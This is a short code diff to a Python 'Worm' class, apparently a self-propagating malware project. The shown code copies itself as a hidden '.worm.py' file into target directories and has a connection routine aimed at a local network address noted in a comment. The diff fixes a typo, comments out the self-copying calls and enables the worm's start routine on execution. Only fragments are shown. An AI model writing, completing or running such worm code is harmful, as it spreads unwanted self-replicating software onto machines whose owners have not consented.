@@ -110,7 +110,7 @@ class Worm:
             destination = os.path.join(directory, ".worm.py")
             shutil.copyfile(self.own_path, destination)
     
-    def copy_exsisting_files(self):
+    def copy_existing_files(self):
         for directory in self.target_dir_list:
             file_list_in_dir = os.listdir(directory)
             for file in file_list_in_dir:
@@ -141,11 +141,14 @@ class Worm:
     def start_worm_actions(self):
         self.list_directories(self.path)
         print(self.target_dir_list)
-        self.create_new_worm()
-        self.copy_exsisting_files()
+        #self.create_new_worm()
+        #self.copy_existing_files()
         self.connection_iterator()
     
 if __name__=="__main__":
     current_directory = os.path.abspath("")
     worm = Worm(path=current_directory)
-    #worm.start_worm_actions()
+    worm.start_worm_actions()
+    
+    
+""" IPV4: 192.168.1.26  Subnet Mask: 255.255.255.0"""
